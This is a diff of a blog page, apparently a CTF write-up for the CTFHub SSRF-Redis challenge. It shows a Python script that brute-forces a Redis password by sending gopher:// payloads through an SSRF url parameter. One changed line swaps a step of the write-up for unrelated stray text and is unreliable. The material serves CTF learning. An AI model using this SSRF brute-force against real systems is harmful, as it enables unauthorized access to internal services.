@@ -25,7 +25,7 @@
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="http://example.com/img/background/fj_img/1.jpg">
 <meta property="article:published_time" content="2023-01-01T06:37:13.000Z">
-<meta property="article:modified_time" content="2023-11-22T02:52:27.417Z">
+<meta property="article:modified_time" content="2023-11-30T12:54:50.289Z">
 <meta property="article:author" content="dddkia">
 <meta property="article:tag" content="web">
 <meta property="article:tag" content="ssrf">
@@ -437,7 +437,7 @@
 <p>环境：CTFHUB-SSRF-Redis协议</p>
 <p>漏洞点：<code>/?url=</code></p>
 <p><img src="/../img/SSRF_img/clip_image002.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
-<p>dict协议探测到6379端口开放</p>
+<p>xxxxxxxxxx npiet.exe -tpic download.png Python</p>
 <p><img src="/../img/SSRF_img/clip_image004.gif" srcset="/img/loading.gif" lazyload alt="img"></p>
 <p>尝试用gopher爆破密码</p>
 <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs py"><span class="hljs-keyword">import</span> requests<br><br>target = <span class="hljs-string">&quot;http://challenge-f6443f96c8918df3.sandbox.ctfhub.com:10800/?url=&quot;</span>  <span class="hljs-comment">#目标url</span><br>rhost = <span class="hljs-string">&quot;127.0.0.1&quot;</span>   <br>rport = <span class="hljs-string">&quot;6379&quot;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;passwd.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> file:<br>    passwds = file.readlines()<br>    <span class="hljs-keyword">for</span> passwd <span class="hljs-keyword">in</span> passwds:<br>        passwd = passwd.strip(<span class="hljs-string">&quot;\n&quot;</span>)<br>        len_pass = <span class="hljs-built_in">len</span>(passwd)<br>        payload = <span class="hljs-string">r&quot;gopher://&quot;</span> + rhost + <span class="hljs-string">&quot;:&quot;</span> + rport + <span class="hljs-string">&quot;/_%252A2%250d%250a%25244%250d%250aAUTH%250d%250a%2524&quot;</span>+<span class="hljs-built_in">str</span>(len_pass)+<span class="hljs-string">r&quot;%250d%250a&quot;</span>+passwd+<span class="hljs-string">r&quot;%250D%250A%252A1%250D%250A&quot;</span><br>        url = target+<span class="hljs-built_in">str</span>(payload)<br>        text = requests.get(url).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;OK&quot;</span> <span class="hljs-keyword">in</span> text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] 爆破成功 密码为: &quot;</span> + passwd)<br>            <span class="hljs-built_in">print</span>(text + payload)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
